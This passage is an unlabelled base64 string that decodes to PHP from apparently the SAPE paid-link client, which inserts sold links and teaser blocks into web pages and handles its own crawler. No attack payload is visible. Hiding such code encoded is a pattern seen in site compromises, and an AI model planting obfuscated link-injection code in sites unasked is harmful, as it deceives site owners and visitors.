YDQtSwg0YLQviDQvtC9INCx0YPQtNC10YIg0L/RgNC+0LjQs9C90L7RgNC40YDQvtCy0LDQvS4KICAgICAqCiAgICAgKiBAcGFyYW0gaW50ICAgJG4gICAgICAg0JrQvtC70LjRh9C10YHRgtCy0L7QstC+INGB0YHRi9C70L7Quiwg0LrQvtGC0L7RgNGL0LUg0L3Rg9C20L3QviDQstGL0LLQtdGB0YLQuAogICAgICogQHBhcmFtIGFycmF5ICRvcHRpb25zINCe0L/RhtC40LgKICAgICAqCiAgICAgKiA8Y29kZT4KICAgICAqICRvcHRpb25zID0gYXJyYXkoKTsKICAgICAqICRvcHRpb25zWydhc19ibG9jayddID0gKGZhbHNlfHRydWUpOwogICAgICogLy8g0J/QvtC60LDQt9GL0LLQsNGC0Ywg0LvQuCDRgdGB0YvQu9C60Lgg0LIg0LLQuNC00LUg0LHQu9C+0LrQsAogICAgICogPC9jb2RlPgogICAgICoKICAgICAqIEBzZWUgcmV0dXJuX2Jsb2NrX2xpbmtzKCkKICAgICAqIEBzZWUgcmV0dXJuX2NvdW50ZXIoKQogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiByZXR1cm5fbGlua3MoJG4gPSBudWxsLCAkb3B0aW9ucyA9IG51bGwpCiAgICB7CgogICAgICAgIGlmICgkdGhpcy0+X2RlYnVnKSB7CiAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2RlYnVnX2JhY2t0cmFjZScpKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+X3JldHVybl9saW5rc19jYWxsc1tdID0gZGVidWdfYmFja3RyYWNlKCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+X3JldHVybl9saW5rc19jYWxscyA9ICIoZnVuY3Rpb25fZXhpc3RzKCdkZWJ1Z19iYWNrdHJhY2UnKT09ZmFsc2UiOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkbnVtYXJncyA9IGZ1bmNfbnVtX2FyZ3MoKTsKICAgICAgICAkYXJncyAgICA9IGZ1bmNfZ2V0X2FyZ3MoKTsKCiAgICAgICAgLy/Qn9GA0L7QstC10YDRj9C10Lwg0LDRgNCz0YPQvNC10L3RgtGLINC00LvRjyDRgdGC0LDRgNC+0Lkg0YHQuNCz0L3QsNGC0YPRgNGLINCy0YvQt9C+0LLQsAogICAgICAgIGlmICgyID09ICRudW1hcmdzKSB7ICAgICAgICAgICAvLyByZXR1cm5fbGlua3MoJG4sICRvcHRpb25zKQogICAgICAgICAgICBpZiAoIWlzX2FycmF5KCRhcmdzWzFdKSkgeyAvLyByZXR1cm5fbGlua3MoJG4sICRvZmZzZXQpIC0gZGVwcmVjYXRlZCEKICAgICAgICAgICAgICAgICRvcHRpb25zID0gbnVsbDsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZWlmICgyIDwgJG51bWFyZ3MpIHsgICAgICAgIC8vIHJldHVybl9saW5rcygkbiwgJG9mZnNldCwgJG9wdGlvbnMpIC0gZGVwcmVjYXRlZCEKCiAgICAgICAgICAgIGlmICghaXNfYXJyYXkoJG9wdGlvbnMpKSB7CiAgICAgICAgICAgICAgICAkb3B0aW9ucyA9ICRhcmdzWzJdOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvL9Ce0L/RgNC10LvQtdC70LjRgtGMLCDQutCw0Log0LLRi9Cy0L7QtNC40YLRjCDRgdGB0YvQu9C60LgKICAgICAgICAkYXNfYmxvY2sgPSAkdGhpcy0+X3Nob3dfb25seV9ibG9jazsKCiAgICAgICAgaWYgKGlzX2FycmF5KCRvcHRpb25zKSAmJiBpc3NldCgkb3B0aW9uc1snYXNfYmxvY2snXSkgJiYgZmFsc2UgPT0gJGFzX2Jsb2NrKSB7CiAgICAgICAgICAgICRhc19ibG9jayA9ICRvcHRpb25zWydhc19ibG9jayddOwogICAgICAgIH0KCiAgICAgICAgaWYgKHRydWUgPT0gJGFzX2Jsb2NrICYmIGlzc2V0KCR0aGlzLT5fYmxvY2tfdHBsKSkgewogICAgICAgICAgICByZXR1cm4gJHRoaXMtPnJldHVybl9ibG9ja19saW5rcygkbiwgJG9wdGlvbnMpOwogICAgICAgIH0KCiAgICAgICAgLy8tLS0tLS0tCgogICAgICAgIGlmIChpc19hcnJheSgkdGhpcy0+X2xpbmtzX3BhZ2UpKSB7CgogICAgICAgICAgICAkdG90YWxfcGFnZV9saW5rcyA9IGNvdW50KCR0aGlzLT5fbGlua3NfcGFnZSk7CgogICAgICAgICAgICBpZiAoIWlzX251bWVyaWMoJG4pIHx8ICRuID4gJHRvdGFsX3BhZ2VfbGlua3MpIHsKICAgICAgICAgICAgICAgICRuID0gJHRvdGFsX3BhZ2VfbGlua3M7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRsaW5rcyA9IGFycmF5KCk7CgogICAgICAgICAgICBmb3IgKCRpID0gMTsgJGkgPD0gJG47ICRpKyspIHsKICAgICAgICAgICAgICAgICRsaW5rc1tdID0gYXJyYXlfc2hpZnQoJHRoaXMtPl9saW5rc19wYWdlKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGh0bWwgPSAkdGhpcy0+X2NvbnZlcnRDaGFyc2V0KGpvaW4oJHRoaXMtPl9saW5rc19kZWxpbWl0ZXIsICRsaW5rcykpOwoKICAgICAgICAgICAgaWYgKCR0aGlzLT5faXNfb3VyX2JvdCkgewogICAgICAgICAgICAgICAgJGh0bWwgPSAnPHNhcGVfbm9pbmRleD4nIC4gJGh0bWwgLiAnPC9zYXBlX25vaW5kZXg+JzsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRodG1sID0gJHRoaXMtPl9saW5rc19wYWdlOwogICAgICAgICAgICBpZiAoJHRoaXMtPl9pc19vdXJfYm90KSB7CiAgICAgICAgICAgICAgICAkaHRtbCAuPSAnPHNhcGVfbm9pbmRleD48L3NhcGVfbm9pbmRleD4nOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkaHRtbCA9ICR0aGlzLT5fcmV0dXJuX2h0bWwoJGh0bWwpOwoKICAgICAgICByZXR1cm4gJGh0bWw7CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHJldHVybl90ZWFzZXJzX2Jsb2NrKCRibG9ja19pZCkKICAgIHsKICAgICAgICBpZiAoJHRoaXMtPl9kZWJ1ZykgewogICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdkZWJ1Z19iYWNrdHJhY2UnKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPl9yZXR1cm5fbGlua3NfY2FsbHNbXSA9IGRlYnVnX2JhY2t0cmFjZSgpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJHRoaXMtPl9yZXR1cm5fbGlua3NfY2FsbHMgPSAiKGZ1bmN0aW9uX2V4aXN0cygnZGVidWdfYmFja3RyYWNlJyk9PWZhbHNlIjsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJGh0bWwgICAgID0gJyc7CiAgICAgICAgJHRlbXBsYXRlID0gQCR0aGlzLT5fbGlua3NbJ19fc2FwZV90ZWFzZXJzX3RlbXBsYXRlc19fJ11bJGJsb2NrX2lkXTsKCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5fdGVhc2Vyc19wYWdlKSAmJiBmYWxzZSA9PSBlbXB0eSgkdGVtcGxhdGUpKSB7CgogICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPl90ZWFzZXJzX3BhZ2UpIDwgJHRlbXBsYXRlWyduJ10pIHsKICAgICAgICAgICAgICAgICR0ZWFzZXJzICAgICAgICAgICAgID0gJHRoaXMtPl90ZWFzZXJzX3BhZ2U7CiAgICAgICAgICAgICAgICAkdG9fYWRkICAgICAgICAgICAgICA9ICR0ZW1wbGF0ZVsnbiddIC0gY291bnQoJHRoaXMtPl90ZWFzZXJzX3BhZ2UpOwogICAgICAgICAgICAgICAgJHRoaXMtPl90ZWFzZXJzX3BhZ2UgPSBhcnJheSgpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJHRlYXNlcnMgICAgICAgICAgICAgPSBhcnJheV9zbGljZSgkdGhpcy0+X3RlYXNlcnNfcGFnZSwgMCwgJHRlbXBsYXRlWyduJ10pOwogICAgICAgICAgICAgICAgJHRvX2FkZCAgICAgICAgICAgICAgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPl90ZWFzZXJzX3BhZ2UgPSBhcnJheV9zbGljZSgkdGhpcy0+X3RlYXNlcnNfcGFnZSwgJHRlbXBsYXRlWyduJ10pOwogICAgICAgICAgICB9CgogICAgICAgICAgICBmb3JlYWNoICgkdGVhc2VycyBhcyAkayA9PiAkdikgewogICAgICAgICAgICAgICAgcHJlZ19tYXRjaCgnI2hyZWY9IihodHRwcz86Ly8oW14iL10rKVteIl0qKSIjaScsICR2LCAkdXJsKTsKICAgICAgICAgICAgICAgICR1cmwgICAgICAgICA9IGVtcHR5KCR1cmxbMV0pID8gJycgOiAkdXJsWzFdOwogICAgICAgICAgICAgICAgJHRlYXNlcnNbJGtdID0gc3RyX3JlcGxhY2UoJ3t1fScsICR1cmwsICR0ZW1wbGF0ZVsnYmknXSAuICR2IC4gJHRlbXBsYXRlWydhaSddKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCR0b19hZGQpIHsKICAgICAgICAgICAgICAgICR0ZWFzZXJzID0gYXJyYXlfbWVyZ2UoJHRlYXNlcnMsIGFycmF5X2ZpbGwoJHRlbXBsYXRlWyduJ10sICR0b19hZGQsICR0ZW1wbGF0ZVsnZSddKSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRodG1sID0gJHRoaXMtPl9jb252ZXJ0Q2hhcnNldCgKICAgICAgICAgICAgICAgICgkdGhpcy0+X3RlYXNlcnNfY3NzX3Nob3dlZCA/ICcnIDogJHRoaXMtPl9saW5rc1snX19zYXBlX3RlYXNlcnNfY3NzX18nXSkgLgogICAgICAgICAgICAgICAgc3RyX3JlcGxhY2UoJ3tpfScsIGltcGxvZGUoJHRlbXBsYXRlWydkJ10sICR0ZWFzZXJzKSwgJHRlbXBsYXRlWyd0J10pCiAgICAgICAgICAgICk7CgogICAgICAgICAgICAkdGhpcy0+X3RlYXNlcnNfY3NzX3Nob3dlZCA9IHRydWU7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5faXNfb3VyX2JvdCB8fCAkdGhpcy0+X2ZvcmNlX3Nob3dfY29kZSkgewogICAgICAgICAgICAgICAgJGh0bWwgPSAkdGhpcy0+X2xpbmtzWydfX3NhcGVfbmV3X3RlYXNlcnNfYmxvY2tfXyddIC4gJzwhLS0gJyAuICRibG9ja19pZCAuICcgLS0+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoIWVtcHR5KCR0ZW1wbGF0ZSkpIHsKICAgICAgICAgICAgICAgICRodG1sIC49IHN0cl9yZXBsYWNlKCd7aWR9JywgJGJsb2NrX2lkLCAkdGVtcGxhdGVbJ2YnXSk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+X3JhaXNlX2Vycm9yKCLQndC10YIg0LjQvdGE0L7RgNC80LDRhtC40Lgg0L/QviDQsdC70L7QutGDICRibG9ja19pZCwg0L7QsdGA0LDRgtC40YLQtdGB0Ywg0LIg0YHQu9GD0LbQsdGDINC/0L7QtNC00LXRgNC20LrQuCIpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoJHRoaXMtPl9pc19vdXJfYm90KSB7CiAgICAgICAgICAgICRodG1sID0gJzxzYXBlX25vaW5kZXg+JyAuICRodG1sIC4gJzwvc2FwZV9ub2luZGV4Pic7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHRoaXMtPl9hZGRfZGVidWdfaW5mbygkdGhpcy0+X3JldHVybl9vYmxpZ2F0b3J5X3BhZ2VfY29udGVudCgpIC4gJGh0bWwpOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBzaG93X2ltYWdlKCRmaWxlX25hbWUgPSBudWxsKQogICAgewogICAgICAgIGlmICgkdGhpcy0+X2RlYnVnKSB7CiAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2RlYnVnX2JhY2t0cmFjZScpKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+X3JldHVybl9saW5rc19jYWxsc1tdID0gZGVidWdfYmFja3RyYWNlKCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+X3JldHVybl9saW5rc19jYWxscyA9ICIoZnVuY3Rpb25fZXhpc3RzKCdkZWJ1Z19iYWNrdHJhY2UnKT09ZmFsc2UiOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVjaG8gJHRoaXMtPl9hZGRfZGVidWdfaW5mbygnJyk7CiAgICAgICAgfQoKICAgICAgICAkZmlsZV9uYW1lID0gJGZpbGVfbmFtZSA/ICRmaWxlX25hbWUgOiBwYXJzZV91cmwoJHRoaXMtPl9yZXF1ZXN0X3VyaSwgUEhQX1VSTF9RVUVSWSk7CgogICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygnX19zYXBlX3RlYXNlcl9pbWFnZXNfXycsICR0aGlzLT5fbGlua3MpIHx8ICFhcnJheV9rZXlfZXhpc3RzKCRmaWxlX25hbWUsICR0aGlzLT5fbGlua3NbJ19fc2FwZV90ZWFzZXJfaW1hZ2VzX18nXSkpIHsKICAgICAgICAgICAgJHRoaXMtPl9yYWlzZV9lcnJvcigi0J3QtdGCINGE0LDQudC70LAg0LjQt9C+0LHRgNCw0LbQtdC90LjRjyDRgSDQuNC80LXQvdC10LwgJyRmaWxlX25hbWUnIik7CiAgICAgICAgICAgIGhlYWRlcigiSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCIpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRleHRlbnNpb24gPSBwYXRoaW5mbyhzdHJ0b2xvd2VyKCRmaWxlX25hbWUpLCBQQVRISU5GT19FWFRFTlNJT04pOwogICAgICAgICAgICBpZiAoJGV4dGVuc2lvbiA9PSAnanBnJykgewogICAgICAgICAgICAgICAgJGV4dGVuc2lvbiA9ICdqcGVnJzsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IGltYWdlLycgLiAkZXh0ZW5zaW9uKTsKICAgICAgICAgICAgaGVhZGVyKCdDb250ZW50LUxlbmd0aDogJyAuIHN0cmxlbigkdGhpcy0+X2xpbmtzWydfX3NhcGVfdGVhc2VyX2ltYWdlc19fJ11bJGZpbGVfbmFtZV0pKTsKICAgICAgICAgICAgaGVhZGVyKCdDYWNoZS1jb250cm9sOiBwdWJsaWMsIG1heC1hZ2U9NjA0ODAwJyk7IC8vMSB3ZWVrCgogICAgICAgICAgICBlY2hvICR0aGlzLT5fbGlua3NbJ19fc2FwZV90ZWFzZXJfaW1hZ2VzX18nXVskZmlsZV9uYW1lXTsKICAgICAgICB9CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9nZXRfZGJfZmlsZSgpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5fbXVsdGlfc2l0ZSkgewogICAgICAgICAgICByZXR1cm4gZGlybmFtZShfX0ZJTEVfXykgLiAnLycgLiAkdGhpcy0+X2hvc3QgLiAnLmxpbmtzLmRiJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gZGlybmFtZShfX0ZJTEVfXykgLiAnL2xpbmtzLmRiJzsKICAgICAgICB9CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9nZXRfZGlzcGVuc2VyX3BhdGgoKQogICAgewogICAgICAgIHJldHVybiAnL2NvZGUucGhwP3VzZXI9JyAuIF9TQVBFX1VTRVIgLiAnJmhvc3Q9JyAuICR0aGlzLT5faG9zdDsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX3NldF9kYXRhKCRkYXRhKQogICAgewogICAgICAgIGlmICgkdGhpcy0+X2lnbm9yZV9jYXNlKSB7CiAgICAgICAgICAgICR0aGlzLT5fbGlua3MgPSBhcnJheV9jaGFuZ2Vfa2V5X2Nhc2UoJGRhdGEpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5fbGlua3MgPSAkZGF0YTsKICAgICAgICB9CiAgICAgICAgaWYgKGlzc2V0KCR0aGlzLT5fbGlua3NbJ19fc2FwZV9kZWxpbWl0ZXJfXyddKSkgewogICAgICAgICAgICAkdGhpcy0+X2xpbmtzX2RlbGltaXRlciA9ICR0aGlzLT5fbGlua3NbJ19fc2FwZV9kZWxpbWl0ZXJfXyddOwogICAgICAgIH0KICAgICAgICAvLyDQvtC/0YDQtdC00LXQu9GP0LXQvCDQutC+0LTQuNGA0L7QstC60YMg0LrQtdGI0LAKICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPl9saW5rc1snX19zYXBlX2NoYXJzZXRfXyddKSkgewogICAgICAgICAgICAkdGhpcy0+X3NhcGVfY2hhcnNldCA9ICR0aGlzLT5fbGlua3NbJ19fc2FwZV9jaGFyc2V0X18nXTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+X3NhcGVfY2hhcnNldCA9ICcnOwogICAgICAgIH0KICAgICAgICBpZiAoQGFycmF5X2tleV9leGlzdHMoJHRoaXMtPl9yZXF1ZXN0X3VyaSwgJHRoaXMtPl9saW5rcykgJiYgaXNfYXJyYXkoJHRoaXMtPl9saW5rc1skdGhpcy0+X3JlcXVlc3RfdXJpXSkpIHsKICAgICAgICAgICAgJHRoaXMtPl9saW5rc19wYWdlID0gJHRoaXMtPl9saW5rc1skdGhpcy0+X3JlcXVlc3RfdXJpXTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPl9saW5rc1snX19zYXBlX25ld191cmxfXyddKSAmJiBzdHJsZW4oJHRoaXMtPl9saW5rc1snX19zYXBlX25ld191cmxfXyddKSkgewogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5faXNfb3VyX2JvdCB8fCAkdGhpcy0+X2ZvcmNlX3Nob3dfY29kZSkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5fbGlua3NfcGFnZSA9ICR0aGlzLT5fbGlua3NbJ19fc2FwZV9uZXdfdXJsX18nXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKEBhcnJheV9rZXlfZXhpc3RzKCR0aGlzLT5fcmVxdWVzdF91cmksICR0aGlzLT5fbGlua3NbJ19fc2FwZV90ZWFzZXJzX18nXSkgJiYgaXNfYXJyYXkoJHRoaXMtPl9saW5rc1snX19zYXBlX3RlYXNlcnNfXyddWyR0aGlzLT5fcmVxdWVzdF91cmldKSkgewogICAgICAgICAgICAkdGhpcy0+X3RlYXNlcnNfcGFnZSA9ICR0aGlzLT5fbGlua3NbJ19fc2FwZV90ZWFzZXJzX18nXVskdGhpcy0+X3JlcXVlc3RfdXJpXTsKICAgICAgICB9CgogICAgICAgIC8v0JXRgdGC0Ywg0LvQuCDQvtCx0Y/Qt9Cw0YLQtdC70YzQvdGL0Lkg0LLRi9Cy0L7QtAogICAgICAgIGlmIChpc3NldCgkdGhpcy0+X2xpbmtzWydfX3NhcGVfcGFnZV9vYmxpZ2F0b3J5X291dHB1dF9fJ10pKSB7CiAgICAgICAgICAgICR0aGlzLT5fcGFnZV9vYmxpZ2F0b3J5X291dHB1dCA9ICR0aGlzLT5fbGlua3NbJ19fc2FwZV9wYWdlX29ibGlnYXRvcnlfb3V0cHV0X18nXTsKICAgICAgICB9CgogICAgICAgIC8vINCV0YHRgtGMINC70Lgg0YTQu9Cw0LMg0LHQu9C+0YfQvdGL0YUg0YHRgdGL0LvQvtC6CiAgICAgICAgaWYgKGlzc2V0KCR0aGlzLT5fbGlua3NbJ19fc2FwZV9zaG93X29ubHlfYmxvY2tfXyddKSkgewogICAgICAgICAgICAkdGhpcy0+X3Nob3dfb25seV9ibG9jayA9ICR0aGlzLT5fbGlua3NbJ19fc2FwZV9zaG93X29ubHlfYmxvY2tfXyddOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5fc2hvd19vbmx5X2Jsb2NrID0gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICAvLyDQldGB0YLRjCDQu9C4INGI0LDQsdC70L7QvSDQtNC70Y8g0LrRgNCw0YHQuNCy0YvRhSDRgdGB0YvQu9C+0LoKICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPl9saW5rc1snX19zYXBlX2Jsb2NrX3RwbF9fJ10pICYmICFlbXB0eSgkdGhpcy0+X2xpbmtzWydfX3NhcGVfYmxvY2tfdHBsX18nXSkKICAgICAgICAgICAgJiYgaXNfYXJyYXkoJHRoaXMtPl9saW5rc1snX19zYXBlX2Jsb2NrX3RwbF9fJ10pCiAgICAgICAgKSB7CiAgICAgICAgICAgICR0aGlzLT5fYmxvY2tfdHBsID0gJHRoaXMtPl9saW5rc1snX19zYXBlX2Jsb2NrX3RwbF9fJ107CiAgICAgICAgfQoKICAgICAgICAvLyDQldGB0YLRjCDQu9C4INC/0LDRgNCw0LzQtdGC0YDRiyDQtNC70Y8g0LrRgNCw0YHQuNCy0YvRhSDRgdGB0YvQu9C+0LoKICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPl9saW5rc1snX19zYXBlX2Jsb2NrX3RwbF9vcHRpb25zX18nXSkgJiYgIWVtcHR5KCR0aGlzLT5fbGlua3NbJ19fc2FwZV9ibG9ja190cGxfb3B0aW9uc19fJ10pCiAgICAgICAgICAgICYmIGlzX2FycmF5KCR0aGlzLT5fbGlua3NbJ19fc2FwZV9ibG9ja190cGxfb3B0aW9uc19fJ10pCiAgICAgICAgKSB7CiAgICAgICAgICAgICR0aGlzLT5fYmxvY2tfdHBsX29wdGlvbnMgPSAkdGhpcy0+X2xpbmtzWydfX3NhcGVfYmxvY2tfdHBsX29wdGlvbnNfXyddOwogICAgICAgIH0KCiAgICAgICAgLy8gSUROQS3QtNC+0LzQtdC90YsKICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPl9saW5rc1snX19zYXBlX2Jsb2NrX3VyaV9pZG5hX18nXSkgJiYgIWVtcHR5KCR0aGlzLT5fbGlua3NbJ19fc2FwZV9ibG9ja191cmlfaWRuYV9fJ10pCiAgICAgICAgICAgICYmIGlzX2FycmF5KCR0aGlzLT5fbGlua3NbJ19fc2FwZV9ibG9ja191cmlfaWRuYV9fJ10pCiAgICAgICAgKSB7CiAgICAgICAgICAgICR0aGlzLT5fYmxvY2tfdXJpX2lkbmEgPSAkdGhpcy0+X2xpbmtzWydfX3NhcGVfYmxvY2tfdXJpX2lkbmFfXyddOwogICAgICAgIH0KCiAgICAgICAgLy8g0JHQu9C+0LrQuAogICAgICAgICRjaGVja19ibG9ja3MgPSBhcnJheSgKICAgICAgICAgICAgJ2JlZm9yZWFsbCcsCiAgICAgICAgICAgICdiZWZvcmVibG9jaycsCiAgICAgICAgICAgICdhZnRlcmJsb2NrJywKICAgICAgICAgICAgJ2l0ZW1vYmxpZ2F0b3J5JywKICAgICAgICAgICAgJ2l0ZW1jb25kaXRpb25hbCcsCiAgICAgICAgICAgICdhZnRlcmFsbCcKICAgICAgICApOwoKICAgICAgICBmb3JlYWNoICgkY2hlY2tfYmxvY2tzIGFzICRibG9ja19uYW1lKSB7CgogICAgICAgICAgICAkdmFyX25hbWUgID0gJ19fc2FwZV9ibG9ja19pbnNfJyAuICRibG9ja19uYW1lIC4gJ19fJzsKICAgICAgICAgICAgJHByb3BfbmFtZSA9ICdfYmxvY2tfaW5zXycgLiAkYmxvY2tfbmFtZTsKCiAgICAgICAgICAgIGlmIChpc3NldCgkdGhpcy0+X2xpbmtzWyR2YXJfbmFtZV0pICYmIHN0cmxlbigkdGhpcy0+X2xpbmtzWyR2YXJfbmFtZV0pID4gMCkgewogICAgICAgICAgICAgICAgJHRoaXMtPiRwcm9wX25hbWUgPSAkdGhpcy0+X2xpbmtzWyR2YXJfbmFtZV07CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCi8qKgogKiDQmtC70LDRgdGBINC00LvRjyDRgNCw0LHQvtGC0Ysg0YEg0LrQvtC90YLQtdC60YHRgtC90YvQvNC4INGB0YHRi9C70LrQsNC80LgKICovCmNsYXNzIFNBUEVfY29udGV4dCBleHRlbmRzIFNBUEVfYmFzZQp7CgogICAgcHJvdGVjdGVkICRfd29yZHMgICAgICAgPSBhcnJheSgpOwogICAgcHJvdGVjdGVkICRfd29yZHNfcGFnZSAgPSBhcnJheSgpOwogICAgcHJvdGVjdGVkICRfdXNlcl9hZ2VudCAgPSAnU0FQRV9Db250ZXh0IFBIUCc7CiAgICBwcm90ZWN0ZWQgJF9maWx0ZXJfdGFncyA9IGFycmF5KCdhJywgJ3RleHRhcmVhJywgJ3NlbGVjdCcsICdzY3JpcHQnLCAnc3R5bGUnLCAnbGFiZWwnLCAnbm9zY3JpcHQnLCAnbm9pbmRleCcsICdidXR0b24nKTsKCiAgICBwcm90ZWN0ZWQgJF9kZWJ1Z19hY3Rpb25zID0gYXJyYXkoKTsKCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJG9wdGlvbnMgPSBudWxsKQogICAgewogICAgICAgIHBhcmVudDo6X19jb25zdHJ1Y3QoJG9wdGlvbnMpOwogICAgICAgICR0aGlzLT5fbG9hZF9kYXRhKCk7CiAgICB9CgogICAgLyoqCiAgICAgKiDQndCw0YfQsNGC0Ywg0YHQsdC+0YAg0LTQtdCx0LDQsy3QuNC90YTQvtGA0LzQsNGG0LjQuAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX2RlYnVnX2FjdGlvbl9zdGFydCgpCiAgICB7CiAgICAgICAgaWYgKCEkdGhpcy0+X2RlYnVnKSB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgICR0aGlzLT5fZGVidWdfYWN0aW9ucyAgID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbnNbXSA9ICR0aGlzLT5fZ2V0X2Z1bGxfdXNlcl9hZ2VudF9zdHJpbmcoKTsKICAgIH0KCiAgICAvKioKICAgICAqINCX0LDQv9C40YHQsNGC0Ywg0YHRgtGA0L7QutGDINC00LXQsdCw0LMt0LjQvdGE0L7RgNC80LDRhtC40Y4KICAgICAqCiAgICAgKiBAcGFyYW0gICAgICAgICRkYXRhCiAgICAgKiBAcGFyYW0gc3RyaW5nICRrZXkKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9kZWJ1Z19hY3Rpb25fYXBwZW5kKCRkYXRhLCAka2V5ID0gJycpCiAgICB7CiAgICAgICAgaWYgKCEkdGhpcy0+X2RlYnVnKSB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIGlmICghZW1wdHkoJGtleSkpIHsKICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25zW10gPSBhcnJheSgka2V5ID0+ICRkYXRhKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbnNbXSA9ICRkYXRhOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqINCS0YvQstC+0LQg0LTQtdCx0LDQsy3QuNC90YTQvtGA0LzQsNGG0LjQuAogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfZGVidWdfYWN0aW9uX291dHB1dCgpCiAgICB7CgogICAgICAgIGlmICghJHRoaXMtPl9kZWJ1ZyB8fCBlbXB0eSgkdGhpcy0+X2RlYnVnX2FjdGlvbnMpKSB7CiAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CgogICAgICAgICRkZWJ1Z19pbmZvID0gJHRoaXMtPl9kZWJ1Z19vdXRwdXQoJHRoaXMtPl9kZWJ1Z19hY3Rpb25zKTsKCiAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25zID0gYXJyYXkoKTsKCiAgICAgICAgcmV0dXJuICRkZWJ1Z19pbmZvOwogICAgfQoKICAgIC8qKgogICAgICog0JfQsNC80LXQvdCwINGB0LvQvtCyINCyINC60YPRgdC60LUg0YLQtdC60YHRgtCwINC4INC+0LHRgNCw0LzQu9GP0LXRgiDQtdCz0L4g0YLQtdCz0LDQvNC4IHNhcGVfaW5kZXgKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHJlcGxhY2VfaW5fdGV4dF9zZWdtZW50KCR0ZXh0KQogICAgewoKICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbl9zdGFydCgpOwogICAgICAgICR0aGlzLT5fZGVidWdfYWN0aW9uX2FwcGVuZCgnU1RBUlQ6IHJlcGxhY2VfaW5fdGV4dF9zZWdtZW50KCknKTsKICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbl9hcHBlbmQoJHRleHQsICdhcmd1bWVudCBmb3IgcmVwbGFjZV9pbl90ZXh0X3NlZ21lbnQnKTsKCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5fd29yZHNfcGFnZSkgPiAwKSB7CgogICAgICAgICA